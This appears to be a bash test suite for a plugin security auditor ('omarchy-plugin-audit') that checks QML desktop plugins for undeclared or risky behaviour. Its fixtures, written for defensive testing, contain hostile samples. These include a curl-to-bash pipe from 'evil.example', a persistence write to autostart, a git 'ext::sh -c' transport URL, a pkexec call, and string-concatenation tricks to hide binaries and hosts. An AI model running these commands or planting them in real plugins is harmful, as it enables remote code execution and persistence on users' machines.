#!/bin/bash

set -euo pipefail

source "$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/base-test.sh"

require_command jq
require_command rg
require_command git

export PATH="$ROOT/bin:$PATH"
export OMARCHY_PATH="$ROOT"

TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

# Write a third-party plugin folder. $2 is the manifest's capabilities object (or
# "null" for none); $3 is the Service.qml body. Every plugin here is a service so
# the manifest is minimal and valid on its own.
write_plugin() {
  local name="$1" capabilities="$2" service_body="$3"
  local dir="$TMPDIR/$name"
  mkdir -p "$dir"
  cat >"$dir/manifest.json" <<JSON
{
  "schemaVersion": 1,
  "id": "acme.$name",
  "name": "Acme $name",
  "version": "1.0.0",
  "kinds": ["service"],
  "entryPoints": { "service": "Service.qml" },
  "capabilities": $capabilities
}
JSON
  printf '%s\n' "$service_body" >"$dir/Service.qml"
  printf '%s\n' "$dir"
}

audit() { "$ROOT/bin/omarchy-plugin-audit" "$@"; }

# ---------------------------------------------------------------- clean plugin

dir=$(write_plugin clean \
  '{"commands": ["notify-send"], "reads": ["~/.config/omarchy"]}' \
  'import Quickshell.Io
QtObject {
  property Process p: Process { command: ["notify-send", "hi"] }
  property FileView v: FileView { path: Quickshell.env("HOME") + "/.config/omarchy/shell.json" }
}')

report=$(audit "$dir" --json)
jq -e '.valid == true and .summary.undeclaredCommands == 0 and .summary.undeclaredReads == 0' <<<"$report" >/dev/null \
  || fail "audit passes a plugin that declares every capability it uses" "$report"
pass "audit passes a plugin that declares every capability it uses"

audit "$dir" --strict >/dev/null 2>&1 \
  || fail "a fully-declared plugin exits 0 under --strict"
pass "a fully-declared plugin exits 0 under --strict"

jq -e '.observed.commands[] | select(.name == "notify-send") | .declared == true' <<<"$report" >/dev/null \
  || fail "a declared command is marked declared" "$report"
pass "a declared command is marked declared"

# ---------------------------------------------------------------- undeclared binary

dir=$(write_plugin sneaky \
  '{"commands": ["notify-send"]}' \
  'import Quickshell.Io
QtObject {
  property Process ok: Process { command: ["notify-send", "hi"] }
  property Process bad: Process { command: ["curl", "-s", "https://evil.example/x"] }
}')

report=$(audit "$dir" --json)
jq -e '.observed.commands[] | select(.name == "curl") | .declared == false' <<<"$report" >/dev/null \
  || fail "a spawned binary outside the declared set is flagged undeclared" "$report"
jq -e '.summary.undeclaredCommands >= 1' <<<"$report" >/dev/null \
  || fail "an undeclared command is counted in the summary" "$report"
pass "a spawned binary outside the declared set is flagged undeclared"

output=$(audit "$dir" --strict) && fail "--strict exits non-zero on an undeclared command" "$output"
pass "--strict exits non-zero on an undeclared command"

# The undeclared host from the same plugin is surfaced too.
jq -e '.observed.network[] | select(.host == "evil.example") | .declared == false' <<<"$report" >/dev/null \
  || fail "an undeclared network host is flagged" "$report"
pass "an undeclared network host is flagged"

# ---------------------------------------------------------------- interpreter + risk

dir=$(write_plugin shellout \
  'null' \
  'import Quickshell.Io
QtObject {
  property Process p: Process { command: ["bash", "-c", "curl https://evil.example/p | bash"] }
}')

report=$(audit "$dir" --json)
# The binary hidden inside the inline shell string is recovered.
jq -e '[.observed.commands[].name] | index("curl") != null' <<<"$report" >/dev/null \
  || fail "a binary inside an inline shell string is recovered" "$report"
# Piping a download into a shell is a high-severity risk.
jq -e '[.risks[] | select(.severity == "high") | .kind] | index("pipe-to-shell") != null' <<<"$report" >/dev/null \
  || fail "piping a download into a shell is a high-severity risk" "$report"
pass "an inline shell command is decomposed and risk-flagged"

output=$(audit "$dir" --strict) && fail "--strict exits non-zero on a high-severity risk" "$output"
pass "--strict exits non-zero on a high-severity risk"

# A redirect hidden inside an inline `sh -c` string is caught as a write, the same
# as one in a bundled shell file, so a persistence write is not missed.
dir=$(write_plugin inline-write \
  '{"commands": ["sh"]}' \
  'import Quickshell.Io
QtObject {
  property Process p: Process { command: ["sh", "-c", "echo x >> ~/.config/autostart/e.desktop"] }
}')

report=$(audit "$dir" --json)
jq -e '[.observed.writes[].path] | index("~/.config/autostart/e.desktop") != null' <<<"$report" >/dev/null \
  || fail "a redirect inside an inline sh -c string is captured as a write" "$report"
jq -e '([.risks[].kind] | index("persistence") != null) and (.verdict.level == "high")' <<<"$report" >/dev/null \
  || fail "an inline-shell write to autostart raises persistence and verdicts high" "$report"
pass "a write hidden in an inline sh -c string is caught (persistence, high)"

# ---------------------------------------------------------------- git provenance

dir=$(write_plugin provenance \
  '{"commands": ["notify-send"]}' \
  'import Quickshell.Io
QtObject { property Process p: Process { command: ["notify-send", "hi"] } }')

git -C "$dir" init -q
git -C "$dir" config user.email test@example.com
git -C "$dir" config user.name "Test"
git -C "$dir" add -A
git -C "$dir" commit -qm "init"

report=$(audit "$dir" --json)
jq -e '.provenance.git == true' <<<"$report" >/dev/null \
  || fail "a git checkout is reported as one" "$report"
pass "a git checkout is reported with its provenance"

# An origin URL that omarchy refuses to clone is flagged, reusing omarchy-git-url-check.
git -C "$dir" remote add origin 'ext::sh -c "id"'
report=$(audit "$dir" --json)
jq -e '.provenance.remoteOk == false' <<<"$report" >/dev/null \
  || fail "a transport-helper origin URL is marked not ok" "$report"
jq -e '[.risks[] | .kind] | index("git-url") != null' <<<"$report" >/dev/null \
  || fail "a refused origin URL raises a git-url risk" "$report"
pass "a refused origin URL is caught via omarchy-git-url-check"

# A normal https origin passes the URL check.
git -C "$dir" remote set-url origin 'https://github.com/acme/omarchy-provenance.git'
report=$(audit "$dir" --json)
jq -e '.provenance.remoteOk == true and ([.risks[] | .kind] | index("git-url") == null)' <<<"$report" >/dev/null \
  || fail "a normal https origin passes the URL check" "$report"
pass "a normal https origin passes the URL check"

# ---------------------------------------------------------------- assignment form

# A plugin that sets Process.command with JS assignment (=), not the QML binding
# (:), still has its spawned binaries captured.
dir=$(write_plugin assigned \
  '{"commands": ["which"]}' \
  'import Quickshell.Io
QtObject {
  property Process a: Process {}
  property Process b: Process {}
  function go() {
    a.command = ["which", "mozillavpn"]
    b.command = ["mozillavpn", "status"]
  }
}')

report=$(audit "$dir" --json)
jq -e '[.observed.commands[].name] | (index("which") != null) and (index("mozillavpn") != null)' <<<"$report" >/dev/null \
  || fail "commands set by assignment (=) are captured, not just the binding form (:)" "$report"
pass "commands set by assignment (=) are captured"

# ---------------------------------------------------------------- helper scripts

# A bundled interpreter helper is only shallowly scanned; the audit says so and
# still captures the interpreter it is launched with.
dir=$(write_plugin helper \
  '{"commands": ["python3"]}' \
  'import Quickshell.Io
QtObject {
  property Process pr: Process {}
  function go() { pr.command = ["python3", "privacy.py", "toggle"]; pr.running = true }
}')
cat >"$dir/privacy.py" <<'PY'
import os
os.replace("/tmp/a", "/tmp/b")
PY

report=$(audit "$dir" --json)
jq -e '[.risks[] | select(.kind == "partial-coverage") | .detail] | any(test("privacy.py"))' <<<"$report" >/dev/null \
  || fail "a bundled Python helper raises a partial-coverage risk naming the file" "$report"
jq -e '[.observed.commands[].name] | index("python3") != null' <<<"$report" >/dev/null \
  || fail "the interpreter that runs a helper script is captured as a command" "$report"
pass "a bundled helper script is flagged as only shallowly scanned"

# ---------------------------------------------------------------- verdict levels

verdict() { audit "$1" --json | jq -r '.verdict.level'; }

dir=$(write_plugin v-minimal 'null' 'import QtQuick
QtObject { property string t: "hi" }')
[[ $(verdict "$dir") == minimal ]] || fail "a plugin that reaches nothing is minimal"
pass "a plugin that reaches nothing verdicts minimal"

dir=$(write_plugin v-low '{"commands": ["notify-send"]}' 'import Quickshell.Io
QtObject { property Process p: Process { command: ["notify-send", "hi"] } }')
[[ $(verdict "$dir") == low ]] || fail "a fully-declared, risk-free plugin is low"
pass "a fully-declared, risk-free plugin verdicts low"

dir=$(write_plugin v-moderate 'null' 'import Quickshell.Io
QtObject { property Process p: Process { command: ["curl", "https://x.example/a"] } }')
[[ $(verdict "$dir") == moderate ]] || fail "an undeclared command/host is moderate"
pass "an undeclared capability verdicts moderate"

dir=$(write_plugin v-high '{"commands": ["pkexec", "systemctl"]}' 'import Quickshell.Io
QtObject { property Process p: Process { command: ["pkexec", "systemctl", "restart", "x"] } }')
[[ $(verdict "$dir") == high ]] || fail "a high-severity risk (privilege escalation) is high"
pass "a high-severity risk verdicts high"

dir=$(write_plugin v-critical 'null' 'import Quickshell.Io
QtObject { property Process p: Process { command: ["bash", "-c", "curl https://x.example | bash"] } }')
[[ $(verdict "$dir") == critical ]] || fail "piping a download into a shell is critical"
pass "a pipe-to-shell pattern verdicts critical"

# The text report ends with the verdict line and points at --explain.
dir=$(write_plugin v-text 'null' 'import Quickshell.Io
QtObject { property Process p: Process { command: ["curl", "https://x.example/a"] } }')
output=$(audit "$dir")
grep -qE 'Verdict: MODERATE' <<<"$output" || fail "the text report prints a verdict line" "$output"
grep -qF 'audit --explain' <<<"$output" || fail "the verdict points at --explain" "$output"
pass "the text report ends with a verdict and points at --explain"

# --explain stands alone (no target) and describes every level.
output=$(audit --explain) || fail "--explain exits 0 without a target"
for lvl in minimal low moderate high critical; do
  grep -qiE "^  $lvl\b" <<<"$output" || fail "--explain describes the '$lvl' level" "$output"
done
pass "--explain describes every risk level without needing a target"

# ---------------------------------------------------------------- evasion & floors

# Declaring a malicious capability silences its undeclared warning, but network
# paired with reading files holds the floor at moderate -- declaration explains a
# capability, it does not make it safe.
dir=$(write_plugin ev-declared '{"commands":["curl"],"network":["evil.example"],"reads":["~/.config/x"]}' \
  'import Quickshell.Io
QtObject {
  property Process p: Process { command: ["curl", "https://evil.example/x"] }
  property FileView f: FileView { path: "~/.config/x/a" }
}')
[[ $(verdict "$dir") == moderate ]] \
  || fail "a declared network+read plugin holds at moderate, not low" "$(audit "$dir" --json)"
pass "declaration does not drop a network+read plugin below moderate"

# A URL assembled at runtime hides the host: one strong evasion signal -> moderate.
dir=$(write_plugin ev-url '{"commands":["curl"]}' \
  'import Quickshell.Io
QtObject { property string h: "evil.example"; property Process p: Process { command: ["curl", "https://"+h+"/x"] } }')
report=$(audit "$dir" --json)
jq -e '([.risks[].kind] | index("computed-url") != null) and (.verdict.level == "moderate")' <<<"$report" >/dev/null \
  || fail "a runtime-built URL is flagged and verdicts moderate" "$report"
pass "a runtime-built URL (hidden host) verdicts moderate"

# A concatenated argv[0] hides the binary: one strong evasion signal -> moderate.
dir=$(write_plugin ev-argv 'null' \
  'import Quickshell.Io
QtObject { property Process p: Process { command: ["cur"+"l", "status"] } }')
report=$(audit "$dir" --json)
jq -e '[.risks[].kind] | index("obfuscated-command") != null' <<<"$report" >/dev/null \
  || fail "a concatenated argv[0] raises obfuscated-command" "$report"
[[ $(verdict "$dir") == moderate ]] || fail "a single evasion signal verdicts moderate" "$report"
pass "a concatenated argv[0] (hidden binary) verdicts moderate"

# Hiding both the binary and the host at once -> high.
dir=$(write_plugin ev-both 'null' \
  'import Quickshell.Io
QtObject { property string h: "evil.example"; property Process p: Process { command: ["cur"+"l", "https://"+h+"/x"] } }')
[[ $(verdict "$dir") == high ]] || fail "two evasion signals verdict high" "$(audit "$dir" --json)"
pass "hiding on two fronts (argv[0] and URL) verdicts high"

# A concatenated *argument* is not a hidden binary: it must not count as
# obfuscated-command (only computed-url), so it does not wrongly escalate to high.
dir=$(write_plugin ev-argonly '{"commands":["curl"],"network":["api.x.example"]}' \
  'import Quickshell.Io
QtObject { property string q: "a"; property Process p: Process { command: ["curl", "https://api.x.example/?x="+q] } }')
report=$(audit "$dir" --json)
jq -e '([.risks[].kind] | index("obfuscated-command") == null) and (.verdict.level != "high")' <<<"$report" >/dev/null \
  || fail "a concatenated argument is not mistaken for a hidden binary" "$report"
pass "a concatenated argument is not counted as a hidden binary"

# The common, benign combo -- a command set from a variable plus a bundled helper --
# must stay moderate: dynamic-command and partial-coverage are weak signals and must
# not escalate on their own (guards mozilla-vpn-style plugins against a false high).
dir=$(write_plugin ev-benign '{"commands":["python3"]}' \
  'import Quickshell.Io
QtObject { property Process a: Process {} function go(){ var c = ["python3", "h.py"]; a.command = c } }')
printf 'import os\n' >"$dir/h.py"
report=$(audit "$dir" --json)
jq -e '([.risks[].kind] | (index("dynamic-command") != null) and (index("partial-coverage") != null)) and (.verdict.level == "moderate")' <<<"$report" >/dev/null \
  || fail "weak signals (variable command + helper) stay moderate, not high" "$report"
pass "common weak signals do not escalate past moderate"

# Privilege escalation combined with network access is critical -- and --explain
# must document that, so the printed levels never contradict the implemented rule.
dir=$(write_plugin ev-priv-net '{"commands":["pkexec"],"network":["x.example"]}' \
  'import Quickshell.Io
QtObject {
  property Process a: Process { command: ["pkexec", "systemctl", "restart", "x"] }
  property Process b: Process { command: ["curl", "https://x.example/y"] }
}')
[[ $(verdict "$dir") == critical ]] \
  || fail "privilege escalation + network verdicts critical" "$(audit "$dir" --json)"
audit --explain | grep -qi 'escalating privilege' \
  || fail "--explain documents privilege escalation + network as a critical trigger"
pass "privilege escalation + network is critical and documented in --explain"

# A high verdict reached only through evasion (both signals are medium risks) must
# still fail --strict even when every observed capability is declared, so --strict
# never disagrees with a high or critical verdict.
dir=$(write_plugin ev-strict '{"commands":["cur"]}' \
  'import Quickshell.Io
QtObject { property string h: "evil.example"; property Process p: Process { command: ["cur"+"l", "https://"+h+"/x"] } }')
report=$(audit "$dir" --json)
jq -e '.verdict.level == "high" and .summary.undeclaredCommands == 0 and .summary.highRisks == 0' <<<"$report" >/dev/null \
  || fail "fixture is a declared, evasion-only high verdict" "$report"
output=$(audit "$dir" --strict) \
  && fail "--strict fails on a high verdict even when every capability is declared" "$output"
pass "--strict fails on any high or critical verdict, not just high-severity risks"

# A `bash -c` whose script is a non-literal (a property/variable) must not crash
# the audit -- grep -v over an all-flags argument list exits 1, which under
# set -e/pipefail once aborted the whole run with blank output -- and the computed
# script must be flagged rather than silently dropped.
dir=$(write_plugin sh-computed 'null' \
  'import Quickshell.Io
QtObject { property string script: "x"; property Process p: Process { command: ["bash", "-c", root.script] } }')
report=$(audit "$dir" --json) || fail "audit must not crash on a computed bash -c script"
jq -e '([.observed.commands[].name] | index("bash") != null) and ([.risks[].kind] | index("dynamic-command") != null)' <<<"$report" >/dev/null \
  || fail "a computed bash -c script is reported (bash captured, flagged dynamic)" "$report"
pass "a computed bash -c script is reported, not crashed on"

# A URL glued to a literal escape inside a string yields a clean host, not the
# trailing text (https://host\n\nMore -> host), and never a host with a backslash.
dir=$(write_plugin url-escape 'null' \
  'import Quickshell.Io
QtObject { property string help: "See https://cli.example.com\n\nMore info"; property Process p: Process { command: ["curl", help] } }')
report=$(audit "$dir" --json)
jq -e '([.observed.network[].host] | index("cli.example.com") != null) and ([.observed.network[].host] | all(test("\\\\") | not))' <<<"$report" >/dev/null \
  || fail "a URL followed by a literal escape yields a clean host" "$report"
pass "a URL with a trailing literal escape extracts a clean host"

# Test and spec files are dev artifacts the shell never loads, so their contents
# must not count toward the verdict. A themebook-style test/*.test.js that evals
# the plugin source (or a top-level *.spec.js) must not raise dynamic-code or push
# the verdict up -- otherwise every plugin that ships tests reads as critical.
dir=$(write_plugin has-tests '{"commands":["notify-send"]}' \
  'import Quickshell.Io
QtObject { property Process p: Process { command: ["notify-send", "hi"] } }')
mkdir -p "$dir/test"
printf 'const src = "x";\neval(src + "\\nmodule.exports = {}")\n' >"$dir/test/model.test.js"
printf 'eval("also ignored")\n' >"$dir/helpers.spec.js"
report=$(audit "$dir" --json)
jq -e '[.risks[].kind] | index("dynamic-code") == null' <<<"$report" >/dev/null \
  || fail "an eval inside a test/spec file is excluded from the scan" "$report"
[[ $(verdict "$dir") == low ]] \
  || fail "test and spec files do not affect the verdict" "$report"
pass "test and spec files are excluded from every scan"

# ---------------------------------------------------------------- resolution errors

output=$(audit "$TMPDIR/does-not-exist" 2>&1) && fail "audit fails on a missing target" "$output"
grep -qi "no plugin folder or installed plugin id" <<<"$output" \
  || fail "audit explains an unresolvable target" "$output"
pass "audit fails clearly on an unresolvable target"
